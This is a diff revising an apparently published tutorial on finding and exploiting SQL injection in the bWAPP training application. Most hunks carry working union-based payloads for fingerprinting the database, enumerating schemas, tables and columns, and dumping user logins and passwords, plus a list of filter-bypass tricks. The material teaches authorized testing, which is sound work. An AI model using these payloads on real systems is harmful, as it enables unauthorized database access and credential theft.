@@ -16,7 +16,7 @@ This guide aims to serve as an introduction to testing for SQL injection and wal
 - Confirmation and exploitation the vulnerability.
 - Best practices for reporting security vulnerabilities.
 
-Tools are not used in this exercise, however, some popular tools will be listed in the **Resources** section below.
+Tools are not used in this exercise, however, some popular tools will be listed in the resources section below.
 
 Code review for SQL injection will be covered in a later post.
 
@@ -59,13 +59,13 @@ For this demonstration, I'm using a test-application called bWAPP (Buggy Web App
 5. Login to bWAPP. The default username is **bee** and password is **bug**.
 6. Select **SQL injection (GET/Search)** from the list of bugs, then click **Hack**. You should be redirected to **bwapp/sqli_1.php**.
 
-> **NOTE:** I'm using PHP 5.6.40 and MySQL 5.7.24. You may experience different results using other versions in your test environment.
+> **NOTE:** I'm using PHP 5.6.40 and MySQL 5.7.25. You may experience different results using other versions in your test environment.
 
-Installation steps and detailed requirements are listed in **install.txt**, which is located in the root directory of the folder you downloaded in Step 1.
+These installation steps, along with detailed requirements, are also listed in **install.txt**, which is located in the root directory of the folder you downloaded in Step 1.
 
 ### Troubleshooting
 
-bWAPP/sqli_1.php connects to a database using **mysql_connect()**. This function was deprecated in PHP 5.5.0 and removed in PHP 7.0.0. If you receive a fatal error: **Call to undefined function mysql_connect()** while trying to use the search feature on this page, consider downgrading from PHP 7 to PHP 5 for this test only. Real PHP applications should run on an updated version of PHP and use [PHP Data Objects (PDO)](https://www.php.net/manual/en/book.pdo.php) to perform database queries.
+bWAPP/sqli_1.php connects to a database using **mysql_connect()**. This function was deprecated in PHP 5.5.0 and removed in PHP 7.0.0. If you receive a fatal error: **Call to undefined function mysql_connect()** while trying to use the search feature on page **bwapp/sqli_1.php**, consider downgrading from PHP 7 to PHP 5 for this test only. Real PHP applications should run on an updated version of PHP and use [PHP Data Objects (PDO)](https://www.php.net/manual/en/book.pdo.php) to perform database queries.
 
 If you encounter other errors, post them in a comments section below.
 
@@ -103,10 +103,10 @@ Radio buttons and checkboxes are other examples. While those elements are typica
 
 This form contains two input variables:
 
-- **title** is defined in the **input** element and is assigned a value of whichever string is in the textbox upon form-submission.
+- **title** is defined in the **input** element and is assigned a value of whichever string is in this field upon form-submission.
 - **action** is defined in the **button** element and is assigned the value **"search"** upon submission.
 
-We can also confirm that there are no hidden inputs and that the data is submitted through a GET request. This is reflected in the URL when we enter the word "test" into the form, then click **Search**:
+We can also confirm that there are no hidden inputs and that the data is submitted through a GET request. This is reflected in the URL when we use the search function. Go back to **bwapp/sqli_1.php**, then enter "test" into the search form and click **Search**:
 
 {:style="text-align: center;"}
 ```url
@@ -120,7 +120,7 @@ For other request methods, you may need to use a proxy server, such as the one a
 
 Now that all of the inputs within our scope have been identified, we can try to determine how those inputs are used by the application. It is important to keep all variables constant except the one being tested so that the results can be attributed to a single cause.
 
-Alter the URL parameters to perform the following tests on the **title** variable:
+Alter the **bwapp/sqli_i.php** URL to perform the following tests on the **title** parameter:
 
 URL Parameters                | Result
 ------------------------------|---------------------------------------------------------------------------------
@@ -157,12 +157,14 @@ The **action** variable is not affecting an SQL query within our test scope and 
 
 In this section, we're injecting SQL into the URL's **title** parameter. Since **title** accepts a string value and is likely wrapped in quotes, try to create a syntax error by submitting unpaired quotation marks.
 
+>**NOTE**: The URL encoding of `'` is `%27` and `"` is `%22`.
+
 URL Parameters         | Result
 -----------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-<span style="white-space: nowrap;">?title='&action=search</span> | 'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1' is returned.
-<span style="white-space: nowrap;">?title="&action=search</span> | 'No movies were found!' is returned.
+<span style="white-space: nowrap;">?title=%27&action=search</span> | 'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1' is returned.
+<span style="white-space: nowrap;">?title=%22&action=search</span> | 'No movies were found!' is returned.
 
-The application returns a MySQL error indicating single quotes are being interpreted as code and break the query:
+The application returns a MySQL error indicating the single quote is being interpreted as code and breaks the query:
 
 <!-- 
 The following codeblock messes up syntax highlighting beneath it if not converted to HTML.
@@ -170,7 +172,7 @@ The following codeblock messes up syntax highlighting beneath it if not converte
 
 
 ```sql
-/* ?title=iron */
+/* ?title=iron - An anticipated search, which works as intended. */
 
 SELECT title, release, character, genre, imdb 
 FROM movie
@@ -178,7 +180,7 @@ WHERE title LIKE '%iron%'
 ORDER BY title ASC;
 
 
-/* ?title=' */
+/* ?title=%27 - An unanticipated search, which breaks the query. */
 
 SELECT title, release, character, genre, imdb 
 FROM movie
@@ -192,7 +194,7 @@ ORDER BY title ASC;
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Visualization of the Potential Database Queries */</span>
 
 
-<span class="cm">/* ?title=iron */</span>
+<span class="cm">/* ?title=iron - An anticipated search, which works as intended. */</span>
 
 <span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">release</span><span class="p">,</span> <span class="n">character</span><span class="p">,</span> <span class="n">genre</span><span class="p">,</span> <span class="n">imdb</span> 
 <span class="k">FROM</span> <span class="n">movie</span>
@@ -200,7 +202,7 @@ ORDER BY title ASC;
 <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">title</span> <span class="k">ASC</span><span class="p">;</span>
 
 
-<span class="cm">/* ?title=' */</span>
+<span class="cm">/* ?title=%27 - An unanticipated search, which breaks the query. */</span>
 
 <span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">release</span><span class="p">,</span> <span class="n">character</span><span class="p">,</span> <span class="n">genre</span><span class="p">,</span> <span class="n">imdb</span> 
 <span class="k">FROM</span> <span class="n">movie</span>
@@ -210,7 +212,7 @@ ORDER BY title ASC;
 
 <!-- ===================================================================  -->
 
-> **NOTE**: It is almost never this easy. Most applications have partial validation or are protected by firewalls and intrusion prevention software. Some techniques for bypassing common defenses include:
+> **NOTE**: It is almost never this easy. Most applications have custom error messages, partial validation, or are protected by firewalls and intrusion prevention software. Some techniques for bypassing common defenses include:
 >
 - Adding whitespace
 - Changing the case of keywords
@@ -226,9 +228,9 @@ Now compare the following tests:
 URL Parameters                        | Result
 --------------------------------------|------------------------------------
 ?test=iron&action=Search              | The movie 'Iron Man' is returned.
-?title=iron'+or+1=1+-\-+&action=search | Presumably all movies are returned.
+?title=iron%27+or+1=1+-\-+&action=search | Presumably all movies are returned.
 
-The second request queries the database to select all movies where the title is like "%iron%" or where 1 is equal to 1. Since 1 is always equal to 1, the database selects all movies. The hyphens at the end comments out everything that follows, preventing the DBMS from parsing the remainder of the query.
+The second request queries the database to select all movies where the title is like "%iron%" or where 1 is equal to 1. Since 1 is always equal to 1, the database selects all movies. The hyphens at the end of the statement comment-out everything that follows, preventing the DBMS from parsing the remainder of the query.
 
 <!-- 
 The following codeblock messes up syntax highlighting beneath it if not converted to HTML.
@@ -242,7 +244,7 @@ WHERE title LIKE '%iron%'
 ORDER BY title ASC;
 
 
-/* ?title=' */
+/* ?title=%27 */
 
 SELECT title, release, character, genre, imdb 
 FROM movie
@@ -263,7 +265,7 @@ ORDER BY title ASC;
 <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">title</span> <span class="k">ASC</span><span class="p">;</span>
 
 
-<span class="cm">/* ?title=' */</span>
+<span class="cm">/* ?title=%27 */</span>
 
 <span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">release</span><span class="p">,</span> <span class="n">character</span><span class="p">,</span> <span class="n">genre</span><span class="p">,</span> <span class="n">imdb</span> 
 <span class="k">FROM</span> <span class="n">movie</span>
@@ -277,7 +279,7 @@ ORDER BY title ASC;
 
 We've proven that we can successfully submit SQL syntax to alter a database query. If this is as far as we could go, it would still be worth reporting, however, it is almost always better to provide a proof of concept in the bug report. (Especially for bug bounties.)
 
-><span class="warning">**IMPORTANT**</span>: Don't compromise an application or data that is in production.
+><span class="warning">**IMPORTANT**</span>: Don't compromise an application or data that is in production. If you're unsure if you should proceed, talk to your supervisor or the person who authorized the test.
 
 #### Union Based Exploitation
 
@@ -291,7 +293,7 @@ SELECT column_one, column_two FROM table_one
 UNION
 SELECT column_one, column_two FROM table_two;
 
-/* This query would return all data in the column_one and column_two of both table_one and table_two. */
+/* This query would return all data in column_one and column_two of both table_one and table_two. */
 
 ```
 
@@ -300,27 +302,27 @@ A union statement must meet two requirements to be successful:
 - Both data sets must have the same number of columns.
 - All data within a column must have a compatible data type. E.g. Strings cannot be combined with a numerical column.
 
-The movie table has 5 columns displayed in the application, so modify the URL to union a select statement with 5 columns. If an error is returned add an additional column. Continue to add columns to the select statement until the query is successful.
+The movie table has 5 columns displayed in the application, so modify the URL to union a select statement with 5 columns. If an error is returned, add an additional column. Continue to add and submit columns to the select statement until the query is successful.
 
 
 URL Parameters                                  | Result
 ------------------------------------------------|--------------------------------------------------------------------------------------------
-?title='UNION+SELECT+1,2,3,4,5+--+&action=1     | 'Error: The used SELECT statements have a different number of columns' is returned.
-?title='UNION+SELECT+1,2,3,4,5,6+--+&action=1   | 'Error: The used SELECT statements have a different number of columns' is returned.
-?title='UNION+SELECT+1,2,3,4,5,6,7+--+&action=1 | Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4.
+?title=%27UNION+SELECT+1,2,3,4,5+-\-+&action=search     | 'Error: The used SELECT statements have a different number of columns' is returned.
+?title=%27UNION+SELECT+1,2,3,4,5,6+-\-+&action=search   | 'Error: The used SELECT statements have a different number of columns' is returned.
+?title=%27UNION+SELECT+1,2,3,4,5,6,7+-\-+&action=search | Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4.
 
-This indicates that the table which the application is querying contains 7 columns, but is only displaying 4 of those columns. Columns 2, 5, and 4, allow text data type. Column 3 is either a number or text data type. 
+This indicates that the table which the application is querying contains 7 columns, but only 4 of those columns are displayed within the application itself. Columns 2, 5, and 4, allow text data type. Column 3 is either a number or text data type. 
 
 #### Fingerprinting 
 
 Now we can begin to union more useful selections in place of the displayed numbers. Submit the following GET request to determine the database user, version number, name, and schema:
 
 {:style="overflow: auto; white-space: nowrap;"}
- `?title='UNION+SELECT+1,current_user(),@@version,database(),schema(),6,7+--+&action=1` 
+ `?title=%27UNION+SELECT+1,current_user(),@@version,database(),schema(),6,7+--+&action=search` 
 
 The variables and functions in this query are built into MySQL. I pulled them from a generic MySQL injection cheat sheet. You can find links to SQLi payloads in the resources section below or by using any search engine, such as DuckDuckGo. 
 
-The reason I know we are working with MySQL is because the error message that was returned from the `?title=&action=search` request included the phrase "MySQL server". If a verbose error message was not returned, you could determine the DBMS by submitting database-specific operators and identifying which ones execute successfully. 
+The reason I know we are working with MySQL is because the error message that was returned from the `?title=%27&action=search` request included the phrase "MySQL server". If a verbose error message was not returned, you could determine the DBMS by submitting database-specific operators and identifying which ones execute successfully. 
 
 E.g. The concatenation operator: 
 
@@ -335,26 +337,41 @@ After the SQL server and version number are identified, search for known vulnera
 
 #### Enumerating Databases
 
-Information_schema is default database on MySQL servers which contains metadata about the server.
+Information_schema is a default database on MySQL servers which contains metadata about the server.
 
-Replace one of the unioned columns with "schema_name" in the select statement from the information_schema.schemata table to determine the names of the databases on a MySQL 5.7.25 server.
+Manipulate the previous GET request to return the name of all databases on the server: 
+
+1. Replace the value of one of the columns that are displayed on the page with **schema_name**.
+2. Add a **FROM information_schema.schemata** clause to the end of the statement.
 
 {:style="overflow: auto; white-space: nowrap;"}
- `?title='UNION+SELECT+1,schema_name,3,4,5,6,7+FROM+information_schema.schemata--+&action=1` 
+ `?title=%27UNION+SELECT+1,schema_name,3,4,5,6,7+FROM+information_schema.schemata--+&action=search` 
+ 
+These are my results, but yours may vary depending on your enviroment:
 
- The default database name for bWAPP is "bWAPP".
+
+Databases          |
+------------------ |
+information_schema |
+bWAPP              |
+mysql              |
+performance_schema |
+sys                |
+
+
+The default database name for bWAPP is "bWAPP".
 
 #### Enumerating Tables
 
 Select table_schema and table_name from information_schema.tables:
 
 {:style="overflow: auto; white-space: nowrap;"}
-`?title='UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+--+&action=1`
+`?title=%27UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+--+&action=search`
 
 This returns all tables for all databases. If you only want to show the tables in bWAPP, append a WHERE clause to the previous query:
 
 {:style="overflow: auto; white-space: nowrap;"}
-`?title='UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+WHERE+table_schema="bWAPP"--+&action=1`
+`?title=%27UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+WHERE+table_schema="bWAPP"--+&action=search`
 
 Results:
 
@@ -368,10 +385,10 @@ bWAPP    | visitors
 
 #### Enumerating Columns
 
-Let's check out the 'users' table. Select table_name and column_name from information_schema.columns where table_name is equal to "users":
+Let's check out the **users** table. Select table_name and column_name from information_schema.columns where table_name is equal to "users":
 
 {:style="overflow: auto; white-space: nowrap;"}
-`?title='UNION+SELECT+1,table_name,3,column_name,5,6,7+FROM+information_schema.columns+WHERE+table_name="users"--+&action=1`
+`?title=%27UNION+SELECT+1,table_name,3,column_name,5,6,7+FROM+information_schema.columns+WHERE+table_name="users"--+&action=search`
 
 
 Results:
@@ -390,12 +407,12 @@ users | USER
 users | CURRENT_CONNECTIONS
 users | TOTAL_CONNECTIONS
 
-#### Dumping the Users Table
+#### Dumping User Credentials
 
 The **users** table has 11 columns, but we only have four columns to work with. I am mostly interested in the username, password, email, and user permissions, so let's select those.
 
 {:style="overflow: auto; white-space: nowrap;"}
-`?title='UNION+SELECT+1,login,admin,password,email,6,7+FROM+users--+&action=1`
+`?title=%27UNION+SELECT+1,login,admin,password,email,6,7+FROM+users--+&action=search`
 
 Results:
 
